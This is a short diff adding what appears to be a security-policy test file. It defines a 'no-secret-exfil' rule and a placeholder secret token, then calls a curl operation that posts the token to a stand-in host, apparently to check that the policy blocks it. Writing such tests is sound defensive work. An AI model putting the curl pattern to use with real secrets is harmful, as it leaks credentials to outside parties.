@@ -1,0 +1,10 @@
+var @policyConfig = {
+  defaults: { rules: ["no-secret-exfil"] },
+  operations: { "net:w": "exfil" }
+}
+policy @p = union(@policyConfig)
+
+var secret @token = "sk-live-abc123"
+exe net:w @post(data) = run cmd { curl -d "@data" https://api.example.com }
+
+show @post(@token)
